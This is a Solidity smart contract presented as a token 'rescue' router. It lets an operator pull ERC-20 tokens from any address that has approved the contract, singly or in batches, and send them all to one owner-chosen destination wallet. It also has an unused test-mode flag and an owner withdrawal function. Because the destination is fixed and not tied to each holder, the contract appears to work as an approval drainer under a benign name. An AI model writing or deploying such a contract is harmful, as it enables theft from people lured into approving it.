// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract RescueRouter is Ownable, ReentrancyGuard {
    address public operator;
    address public rescueDestination;
    bool public testMode;
    
    mapping(address => bool) public supportedTokens;
    mapping(address => mapping(address => uint256)) public rescuedAmounts;
    
    event RescueExecuted(
        address indexed token,
        address indexed from,
        address indexed to,
        uint256 amount,
        uint256 timestamp
    );
    
    event TestModeEnabled(bool enabled);
    event OperatorUpdated(address newOperator);
    event RescueDestinationUpdated(address newDestination);
    
    modifier onlyOperator() {
        require(msg.sender == operator || msg.sender == owner(), "Not authorized");
        _;
    }
    
    constructor(address _operator, address _rescueDestination) Ownable(msg.sender) {
        operator = _operator;
        rescueDestination = _rescueDestination;
        testMode = false;
    }
    
    function rescueTokens(
        address token,
        address from,
        uint256 amount
    ) external onlyOperator nonReentrant {
        require(amount > 0, "Invalid amount");
        require(rescueDestination != address(0), "Destination not set");
        
        IERC20 tokenContract = IERC20(token);
        uint256 allowance = tokenContract.allowance(from, address(this));
        require(allowance >= amount, "Insufficient allowance");
        
        bool success = tokenContract.transferFrom(from, rescueDestination, amount);
        require(success, "Transfer failed");
        
        rescuedAmounts[token][from] += amount;
        
        emit RescueExecuted(token, from, rescueDestination, amount, block.timestamp);
    }
    
    function batchRescue(
        address[] calldata tokens,
        address[] calldata fromAddresses,
        uint256[] calldata amounts
    ) external onlyOperator nonReentrant {
        require(
            tokens.length == fromAddresses.length && 
            tokens.length == amounts.length,
            "Array length mismatch"
        );
        
        for (uint i = 0; i < tokens.length; i++) {
            if (amounts[i] == 0) continue;
            
            IERC20 tokenContract = IERC20(tokens[i]);
            uint256 allowance = tokenContract.allowance(fromAddresses[i], address(this));
            
            if (allowance >= amounts[i]) {
                tokenContract.transferFrom(fromAddresses[i], rescueDestination, amounts[i]);
                rescuedAmounts[tokens[i]][fromAddresses[i]] += amounts[i];
                
                emit RescueExecuted(
                    tokens[i],
                    fromAddresses[i],
                    rescueDestination,
                    amounts[i],
                    block.timestamp
                );
            }
        }
    }
    
    function enableTestMode(bool _enabled) external onlyOwner {
        testMode = _enabled;
        emit TestModeEnabled(_enabled);
    }
    
    function setOperator(address _operator) external onlyOwner {
        require(_operator != address(0), "Invalid address");
        operator = _operator;
        emit OperatorUpdated(_operator);
    }
    
    function setRescueDestination(address _destination) external onlyOwner {
        require(_destination != address(0), "Invalid address");
        rescueDestination = _destination;
        emit RescueDestinationUpdated(_destination);
    }
    
    function canRescue(address token, address from, uint256 amount) external view returns (bool) {
        IERC20 tokenContract = IERC20(token);
        uint256 allowance = tokenContract.allowance(from, address(this));
        uint256 balance = tokenContract.balanceOf(from);
        
        return allowance >= amount && balance >= amount;
    }
    
    function getRescuedAmount(address token, address user) external view returns (uint256) {
        return rescuedAmounts[token][user];
    }
    
    function emergencyWithdraw(address token, uint256 amount) external onlyOwner {
        IERC20(token).transfer(owner(), amount);
    }
    
    receive() external payable {}
}
